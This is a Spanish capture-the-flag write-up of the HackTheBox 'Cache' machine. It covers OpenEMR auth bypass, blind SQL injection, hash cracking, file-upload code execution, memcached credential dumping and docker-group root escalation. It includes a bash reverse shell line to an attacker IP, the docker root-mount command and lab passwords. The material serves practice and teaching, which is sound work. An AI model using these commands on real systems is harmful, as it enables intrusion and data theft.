---
layout      : post
title       : "HackTheBox - Cache"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bannercache.png
categories  : [ htb ]
tags        : [ SQLi, docker, memcached ]
---
Máquina Linux nivel medio. Veremos el uso del VirtualHosting, bypassearemos cositas e injectaremos otras. Tendremos que movernos mediante la cache en memoria y Docker para volvernos root.

![cacheHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/cacheHTB.png)

### Alo, primero el TL;DR (Spanish writeup)

Esta máquina nos presenta el uso del `VirtualHosting`, con el que nos encontraremos al servicio `OpenEMR` el cual tiene varias vulnerabilidades, nos aprovecharemos primero de un `bypass` por medio de sesiones mal configuradas, lo siguiente será una explotación `SQLinjection` para extraer data de la base de datos... Posteriormente obtendremos el usuario `openemr_admin` y su hash, crackearemos el hash y podremos logearnos en el servicio `openemr`... 

Usamos otra vulnerabilidad en la que podemos subir un archivo predeterminado pero cambiando el contenido, en el que alojaremos la posibilidad de ejecutar comandos. 

Estando dentro de la máquina extraeremos data en caché que se está guardando con la utilidad `memcached`, obtendremos la contraseña del usuario `luffy`, vemos que está asignada al grupo `docker` y usaremos eso para obtener una Shell como `root`. (así en muy, muy pocas palabras (: Disfruten)

> Como lo he dicho en otras maquinas, me gusta enfocarme en las personas que apenas estan iniciando en este universo paralelo. Por lo tanto si vez o mucho texto o que explico de más, pues ya sabes la razón, sin más, muchas gracias y a romper todo

* Además te agrego que me he creado un [script en python](https://github.com/jntxJ/Writeups/blob/master/HTB/Cache/fileup2revsh.py) para automatizar la subida del archivo y obtención de la reverse shell, ta guapazo

...

Tendremos 3 fases como casi siempre. Enumeración, explotación y escalada de privilegios :)

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración {#enumeracion}

Iniciamos con un escaneo de servicios, usando `nmap` podemos validar que está corriendo cada puerto.

```bash
$ nmap -p- --open -T5 -Pn -v 10.10.10.188 -oG initScan
```

Pero este escaneo va algo lento, así que podemos agregarle otro parámetro y quitar él `-T`

```bash
$ nmap -p- --open --min-rate=5000 -Pn -v 10.10.10.188 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -T5        | Forma de escanear superrápido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)  |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos                                      |
| -Pn        | Evita que realice Host Discovery, como resolución DNS y Ping                                             |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable, ya veremos para que                                |

![nmapInitScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/initScan.png)

Con la función que creo [s4vitar](https://s4vitar.github.io/) podemos extraer los puertos del archivo **initScan** fácilmente, ya que nos los copia en la clipboard para tenerlos listos para el siguiente escaneo. Evitamos escribirlos uno a uno, en este caso se ve innecesario al ser solo 2 puertos, pero si tuviéramos muchos puertos nos sería de mucha utilidad (: hechenle un ojo. Solo deben agregarla en mi caso al `$ ~/.bashrc`.

![extractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png)

Ahora que tenemos los puertos, haremos un escaneo para validar que versión y scripts maneja en este caso el puerto **HTTP** y el **SSH**.

```bash
$ nmap -p22,80 -sC -sV 10.10.10.188 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

![nmapPortScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/portScan.png)

### Veamos la página web (puerto 80)

![pageinit](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pageinit.png)

Leyendo (todo es interesante) pero con respecto al reto, vemos un `/login.html` e información en `/author.html`, primero inspeccionemos **login.html**.

![pagelogin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagelogin.png)

Es un simple login, pero que si hacemos pruebas, primero válida que el campo **password** sea igual a algo, si no, nos muestra una alerta diciendo que lo que pusimos no concuerda con "algo" y después hace lo mismo con el campo **username**. En este caso se me viene a la mente hacer un fuzzing a los campos (con wfuzz es fácil), ya que si le atinamos al campo **password** supongo que ya no nos va a mostrar ninguna alerta.

Mirando el código fuente vemos que la petición se envía a la página `/net.html` (esto es un rabbit hole, pero igual les comentaré que hice rápidamente :P).

Cuando queremos ingresar nos redirige a `/login.html`, pero igual podemos ver el código fuente de `/net.html` en una nueva pestaña con **CTRL + U**.

![pagenet](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagenet.png)

Y acá vemos el redireccionamiento, pero nada más... Una imagen, que podríamos pensar en esteganografia como un método a ver si esconde algo (pero no, no hay nada, es todo una mentira e.e) Pues nada, acá me perdí completamente, no veía nada que resaltara... (díganme que también vieron algo poco usual en la imagen del `/login.html`, por que yo estuve estancado con el login por no ver eso).

Bueno pues en la imagen nos muestra un script de `jquery` llamado `functionality.js` Y si nos dirigimos a ver el script obtenemos unas credenciales, probablemente para usar en otro sitio, debemos seguir enumerando, ya que no hay nada que nos sirva en **/net.html**... Intentando conectarnos con estas credenciales por el servicio `SSH` no funciona :(

* username: ash
* password: H@v3_fun

También después de estar estancado sin saber hacia donde ver, alguien me hecho una manito diciéndome que el autor me quería decir algo. **(`author.html`)**.

![pageauthor](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pageauthor.png)

Pues mirando nos dice que tiene otro proyecto llamado *Hospital Management System* **(HMS)**, el cual si buscamos en internet es un software que gestiona/controla diferentes aspectos dentro de una clínica, tales como el administrativo, legal y financiero. Pues el software ya tiene **exploits** relacionados a **SQLi** y uno que hace un bypass de autenticación. Perooooo si todo está relacionado, entonces tenemos que ver que [vHost](https://es.wikipedia.org/wiki/Alojamiento_compartido) está alojado en el servidor **10.10.10.188/algoquenoslleveaHMS**.

Si miramos los exploits de HMS, siempre los relacionan así:

* `10.10.1.188/hospital/hospital/hms/cositasparomper.html`
* `10.10.1.188/hms/cositasparomper.html`  

Pero todas nos dan respuesta 404, así que debemos seguir enumerando.

Pues estuve mucho tiempo varado, perdido, no sabía que hacer realmente, estuve revisando el foro de HTB pero las pistas me parecía haberlas hecho e intentado antes...

Con base en lo que dice la página inicial y la página del autor haciendo alusión a **cache.htb**, intente modificar en el archivo `/etc/hosts`, para que cuando haga una petición en el navegador hacia **cache.htb** me redirija como si estuviera colocando **10.10.10.188**. 

> Sobre el archivo `hosts`, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.

* Info sobre el archivo [/etc/hosts](http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html)

Haciendo la prueba con `cache.htb` me daba el mismo output de la página inicial.

```bash
cat /etc/hosts

  10.10.10.188  cache.htb
```

Pero indagando y leyendo, caí en cuenta que tenemos un "algo" relacionado a HMS, entonces podemos intentar que nuestra dirección IP **10.10.10.188** interprete su contenido con el hostname **hms.htb** en nuestro archivo `/etc/hosts`.

```bash
cat /etc/hosts

  10.10.10.188  hms.htb
```

Ponemos en la barra del navegador **hms.htb** y...

![pagehms](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagehms.png)

Opa, perfecto, tenemos un login y un nuevo software, **openEMR**. (no pude quitar el `Invalid username or password` para que quedara bien la imagen :s).

> [OpenEMR](https://es.wikipedia.org/wiki/OpenEMR): Es un software de administración de práctica médica qué también apoya registros médicos electrónicos.

Pues inicialmente no hay ni credenciales por default, ni en el login logre hacer alguna SQLi o algún tipo de XSS.

Revisando la documentación hay muchas cosas interesantes, tenemos un árbol de archivos para revisar (de los cuales podemos sacar nombres de tablas y columnas), también algunos archivos principales yyy mucho por aprender :P

* [Acá](https://www.open-emr.org/wiki/index.php/File_Structure) esta la estructura que maneja el software.

![pagemrlibrary](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagemrlibrary.png)

Algunos de ellos nos dan info de tablas, en este caso listé solo las que tuvieran la tabla `users`.

![bashfromusers](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bashfromusers.png)

De la documentación hacen referencia a un archivo `http://hms.htb/admin.php` el cual almacena el **nombre de la base de datos** y la **versión** que tiene instalada el servidor.

| Site ID | DB Name | Site Name | Version    | Action |
| --------|:------- |:--------- |:---------- |:------ |
| default | openemr | OpenEMR   | 5.0.1 (3)  | Log In |

... Enumerando y enumerando ando, en la documentación y en la web se hace referencia a muchos archivos, algunos interesantes pero sin nada interesante :P

Existen vaaaaaaaaaaarias vulnerabilidades en vaaaaaaaaarios archivos que maneja el servicio. Encontré un documento en el que relaciona la mayoría, es alucinante, emocionante y preocupante :D

* [Reporte de vulnerabilidades.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf).

Bueno, empieza la locura :P

En el mismo `.pdf` la mayoría de cosas hermosas a explotar las podemos hacer solo si estamos autenticados con algún usuario... Peero también tenemos algunos bypass authentication, entonces siguiendo uno de ellos (prueba y error) logramos obtener una vulnerabilidad SQLi Blind.

Alguna info sobre SQLi Blind: 

1. [sql-injection/blind](https://portswigger.net/web-security/sql-injection/blind).
2. [blind-sql-injection](https://medium.com/@nyomanpradipta120/blind-sql-injection-ac36d2c4daab).
3. [blind-sql-injection-i-de-en-mysql](https://www.elladodelmal.com/2007/06/blind-sql-injection-i-de-en-mysql.html).
4. [s4vitar](https://www.youtube.com/watch?v=DpLGgFrHe3o&t=1864) no puede faltar.

Pues siguiendo el documento vemos que si hacemos una petición a alguna página que necesite autenticación, claramente nos debe salir un error o algo informándonos que no tenemos credenciales válidas.

Ejemplo: 

* Si hacemos una petición a `http://hms.htb/portal` y desde esa página (u otra) intentamos entrar a alguna página que si o si necesite autenticación (por ejemplo a `/portal/find_appt_popup_user.php`), pues nos va a salir un error y nos redirigirá a `/portal`. 

**Pero** si primero hacemos una petición a `http://hms.htb/portal/account/register.php` y posteriormente volvemos a hacer la petición a `/portal/find_appt_popup_user.php` nos dejará ver su respuesta :o 

Lo que hace la página `register.php` es que guarda 2 cookies, pero en este caso como si el usuario ya estuviera creado, pues nos aprovechamos de eso y usamos esas cookies para ingresar a alguna página que necesite autenticación.

Como de nuestra enumeración inicial obtuvimos el nombre de la base de datos, algunas tablas y también algunos nombres de columnas. Pues podemos ahorrarnos la fase de descubrir eso e intentar sacar info de alguna tabla. 

...

## Explotacion

Me apoyé en el video de s4vitar para crear un exploit que me ayudara a explotar la vulnerabilidad, ya sabemos que tenemos una tabla llamada **users** (igual con el exploit podemos obtenerlos), será nuestro principal foco, queda dumpear la tabla a ver que data tiene.

![sqlifromusers](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlifromusers.png)

Listando los usuarios de la tabla obtuve uno que me llama la atención, veamos como está guardada la password.

![sqlicheckuser](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlicheckuser.png)

Acá nos vamos fuertemente troleados :s

![sqlicheckpwufail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlicheckpwufail.png)

Esa password no nos funciona en ningún lado, y pues validando con los demás usuarios que vimos sale la misma password :P debemos enumerar más a ver que tablas pueden llamar la atención. Investigando y concatenando cositas logramos obtener las tablas y ordenarlas de manera descendente para tener todo lo que tenga que ver con **u**ser más rápido.

![sqlicheckorderby](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlicheckorderby.png)

**(Solo como 2 horas después de haber hecho esto, vi que en mis notas y archivos interesantes también obtuve un archivo, `database.sql`... Y si, el archivo tiene los nombres de las tablas creadas (: (: (: (: pero bueno, aprendimos a poner el DESC en una inyección SQL blind :P)**

Tenemos dos que se ven interesantes, pero me inclino por la que contiene algo sobre seguridad, veamos que columnas tiene la tabla `users_secure`.

![sqlichecktuserss](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlichecktuserss.png)

Y probemos de una con el usuario `openemr_admin` y veamos si podemos obtener la password, que lo más seguro es que esté en formato hash, ya que tenemos un campo **salt**.

![sqlichecktusspwa](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlichecktusspwa.png)

![sqlichecktusssalta](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlichecktusssalta.png)

```py
hash = $2a$05$l2stlig6gtbeybf7takl6ttewjdmxs9bi6lxqlfcpecy6vf6p0b
salt = $2a$05$l2stlig6gtbeybf7takl6a$
```

Pero revisando en la web tipos de hash, puede ser un **bcrypt** (por las iniciales, pero ningún identificador lo reconoce), solo que en la mayoría de los casos (sería muy loco donde nuestro hash no) también existen mayúsculas... Y en el que tenemos solo -tenemos- minúsculas... Jmmmmm.

* Información sobre los [Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).

Fue todo un reto (más que todo por que tenía un signo mal en el script que no había captado y yo como loco buscando y releyendo cosas) pero logré encontrar la manera que me trajera la info tal como está en la tabla. Ya que nuestra anterior consulta no era sensible a mayúsculas o minúsculas. Intente poner en nuestra variable **dic** el abecedario en mayúscula pero daba igual, si encontraba la letra la traía en minúscula.

Logre solucionarlo pasando cada carácter a ASCII, para posteriormente compararlo con un rango de valores que trabajaban como una tabla ASCII y con ese resultado, pasar el decimal a carácter. Igual sonó complicado (o no) pero es super sencillo:

* Sí el primer carácter del campo **password** es la `j` (aún no lo sabriamos), en ASCII sería: **106** (esto lo mostraria el exploit), simplemente tomando ese 106 y comparandolo con el 106 de la tabla ASCII, podemos darnos cuenta que la `j` corresponde al 106, por lo tanto que la primera letra del campo `password` es la `j`... Y asi con toda la cadena :)

![sqlihashpwopadmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlihashpwopadmin.png)

![sqlisaltpwopadmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/sqlisaltpwopadmin.png)

```py
hash = $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
salt = $2a$05$l2XTLIG6GTBeyBf7TAKL6A$
```

Claramente son muy diferentes con respecto a los otros que ya habíamos obtenido. Podemos usar de nuevo algún identificador de hashes, el cual nos confirma que es un hash bcrypt. Usaré **hashcat** para intentar crackearlo.

```bash
$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

* **-m** : Tipo de hash a crackear
* **-a 0** : Ataque por diccionario
* **hash.txt** : Acá tenemos nuestro hash
* **rockyou.txt** : El wordlist que queremos emplear

![bashashcatdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bashashcatdone.png)

Y listo, parece error o inusual (lo es) pero esa es la **password** del usuario **openemr_admin** para ingresar al login de `http://hms.htb/`

Listo, revisando el mismo `pdf` que contiene un increíble recuento de vulnerabilidades podemos ver varias maneras de obtener ejecución de comandos, entre ellas una que ya tiene un [exploit](https://www.exploit-db.com/exploits/45161) para solo ejecutar el comando y ya estaríamos dentro. Pero algo me freno de usar ese script y es que al ejecutarlo modifica la configuración global y al ser una máquina que no solo nosotros usamos, probablemente la dañe y sea necesario resetear la máquina.

Si no queremos que modifique las configuraciones globales debemos cambiar el payload, pero no entendí que debía cambiar... Así que opte por buscar otra vulnerabilidad (tenemos varias) que podamos usar.

Encontramos un **file upload vulnerability** que podemos usar para montar un archivo y modificar su contenido para ejecutar comandos en el sistema. 

![pagefileupvuln](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagefileupvuln.png)

![pagemanagesitefiles](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagemanagesitefiles.png)

Nos indica que va a guardar los archivos en `/public_html/sites/default/`, pero si validamos, esa ruta no existe. Buscando por internet encontramos un PoC que explota esta vulnerabilidad y también nos indica la ruta donde se guardarán los archivos, **`/sites/default/`**.

* [Remote Code Execution OpenEMR](https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary).

![pageindexofsitesdef](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pageindexsitesdef.png)

Si seguimos el PoC, interceptamos la petición y modificamos su contenido, logramos subir el archivo... Intente cambiarle el nombre pero al parecer solo recibe **custom_pdf.php**, si revisamos de nuevo la página vemos en el apartado **Edit File**, que entre esos esta por default el archivo que queremos subir, así que debe hacer una validación en la que simplemente se puedan editar los archivos de esa lista. (no logre tomar screen a la lista, pero al menos vemos que sin haber subido aún el archivo (queda en ti creerme :P) aparece por default).

![pagemanagesitepdf](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/pagemanagesitespdf.png)

Bueno, mucho texto y nada que explotamos esto e.e.

![burpuploadfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/burpuploadfile.png)

En el contenido simplemente recibimos una petición get y lo que sea, será ejecutado en el sistema. Mandemos una Reverse Shell a ver... Ya saben, es necesario que pasemos a URL encode nuestra petición, ya que probablemente el navegador no haga nada si le pasamos por ejemplo:

```php
xmd=?bash -c 'bash -i >& /dev/tcp/10.10.15.21/4433 0>&1'
```

No hará nada, pensaremos que está mal y no, solo debemos pasarla a URL encode y quedaría como en la imagen (:

![bashcurlrevshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/bashcurlrevshell.png)

La Shell que tenemos no es completamente interactiva, por lo tanto debemos darle un tratamiento a la tty, algunos links donde se explica.

* [Convertir a una shell completamente interactiva](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
* [Resumido y facil (Gracias s4vitar)](https://www.youtube.com/watch?v=amKkzk-yP14&t=953)

Ahora que estamos en la máquina procedemos a enumerar usuarios.

![revshusers](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshusers.png)

Tenemos al usuario `ash` y `luffy`, si recuerdan al inicio de nuestra enumeración obtuvimos unas credenciales de **ash** su contraseña era **H@v3_fun**, validemos si nos permite ingresar.

![revshellashh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshellash.png)

Enumerando el archivo `$ /etc/passwd` vemos 2 programas interesantes, **mysql** y **memcached**.

![revshetcpasswd](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshetcpasswd.png)

Podríamos intentar con mysql ver si **luffy** está en la base de datos y obtener su password, pero no tendría sentido que (en caso de estar) la contraseña nos funcione, ya que sería una contraseña pero de *openemr* ósea del login y necesitamos una pero del sistema.

Validando **memcached** por internet, la definición nos la da claramente el mismo [soporte](http://memcached.org/).

> Sistema de almacenamiento en caché... Diseñado para acelerar las aplicaciones web dinámicas aliviando la carga de la base de datos.

Pues esto ya suena raro e interesante. Previamente había visualizado con `$ netstat -a` que el puerto **11211** estaba a la escucha en local y siguiendo este informe (u otros) podemos ver que **memcached** usa ese puerto, los pasos para usarlo están en el mismo informe.

* [Tutorial: Accessing-Memcached-from-the-command-line](https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line).

Demosle 

```bash
$ telnet localhost 11211
...
...
> stats # Vemos estadisticas importantes del servidor que corre Memcached
...
STAT pid 979
STAT uptime 7565
STAT time 1599596958
STAT version 1.5.6 Ubuntu
...
...
END
> stats slabs # La data es guardada en "slabs" que serian como particiones en memoria
...
...
...
STAT 1:total_chunks 10922
STAT 1:used_chunks 5
STAT 1:free_chunks 10917
STAT 1:free_chunks_end 0
STAT 1:mem_requested 371
STAT 1:get_hits 8
...
END
# Vemos que solo tenemos un solo "slab (el numero al lado de STAT)" que tiene varios items, ahora podemos dumpear data con ese número
...
> stats cachedump 1 0 # El 1 es el ID del "slab" y con el 0 le indicamos que muestre todos los items
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
> get user # Con esto simplemente le decimos que nos muestre que tiene ese item
VALUE user 0 5
luffy
END
> get passwd
VALUE passwd 0 9
0n3_p1ec3
END
> get file 
VALUE file 0 7
nothing
END
> get link
VALUE link 0 21
https://hackthebox.eu
END
> get account
VALUE account 0 9
afhj556uo
END
```

Obtuvimos una contraseña guardada en memoria del usuario **luffy**, validemos si funciona

![revshsuluffy](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshsuluffy.png)

...

## Escalada de privilegios

Muy bien, muy bien... Vemos que tiene asignado el grupo **docker**, a hacer research y ver como podemos explotar eso... Hay varios blogs donde nos explican como vulnerar esto, necesitamos saber que `images` tiene docker, para posteriormente ejecutar un truco con el cual docker permite crear una montura de un archivo o directorio, y pues como para ejecutar **docker** se necesita ser administrador o estar en el grupo **docker** (que sería lo mismo que ser administrador)... Entonces lo que ejecutemos con docker será llevado a cabo con permisos de administrador (:

> Una *imagen* podría contener un sistema operativo Ubuntu con un servidor Apache y tu aplicación web instalada. Las imágenes se utilizan para crear contenedores, y nunca cambian". [JavierGarzas.com](https://www.javiergarzas.com/2015/07/entendiendo-docker.html)

Algunos artículos que encontré explicando la vulnerabilidad:

* [root-your-docker-host-in-10-seconds-for-fun-and-profit](https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/).
* [privilege-escalation-via-docker](https://fosterelli.co/privilege-escalation-via-docker).
* [the-docker-group-and-privilege-escalation](https://blog.martiert.com/the-docker-group-and-privilege-escalation/).

Entonces... Necesitamos una imagen, podemos ver las que tiene la máquina con: 

```bash
$ docker images
```

![revshdockimgs](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshdockimgs.png)

Y ahora podemos decirle a docker que nos cree una montura en la que (mientras estemos conectados a docker) nos haga un espejo de (en este caso) toda la raíz del sistema en el directorio `/tmp/`, por lo que al ingresar a *tmp/* veremos la copia de los archivos y podremos recorrerla con una Shell :) como **root**

* [Documentación **docker run**](https://docs.docker.com/engine/reference/run/).
* [Info sobre **volumes**](https://docs.docker.com/storage/volumes/).

```bash
$ docker run -it --volume /:/tmp/ ubuntu:latest
```

* **-i** : El que nos permite interactuar escribiendo
* **-t** : Permite tener una pseudo consola
* **--volume** : El responsable de la montura
* **ubuntu:latest** : La imagen que enumeramos

![revshdockroot](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshdockroot.png)

Opaaaaaaa que hermosa forma de escalar privilegios. Ahora simplemente nos faltaría ver las flags :)

![revshflags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cache/revshflags.png)

Pero no tenemos una Shell interactiva, acá podríamos hacer varias cosas, pasarla a interactiva, subir el binario de netcat, crear un usuario en el sistema con privilegios para evitar hacer el proceso con docker y varias cositas más... 

...

Acá el script que automatiza la subida del archivo y genera la petición para obtener la Shell. Así que debes ponerte en escucha y ejecutarlo

> [fileup2revsh.py](https://github.com/jntxJ/Writeups/blob/master/HTB/Cache/fileup2revsh.py).

...

Una muy bonita maquina, la elevación con **docker** me fascino, el inicio casi me hace llorar pero se logró. En general muy buena maquina, linda linda.

Bueeeno como siempre digo, gracias por leerme, espero haber aportado algo, y ya sabes, a seguir rompiendo todo (:
